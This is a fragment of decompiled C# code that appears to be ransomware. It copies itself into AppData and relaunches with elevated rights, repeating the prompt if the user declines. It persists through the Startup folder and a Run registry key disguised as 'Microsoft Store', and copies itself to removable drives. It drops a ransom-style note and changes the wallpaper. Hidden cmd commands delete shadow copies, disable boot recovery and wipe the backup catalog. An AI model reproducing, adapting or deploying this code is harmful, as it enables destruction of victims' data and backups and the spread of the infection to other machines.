		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
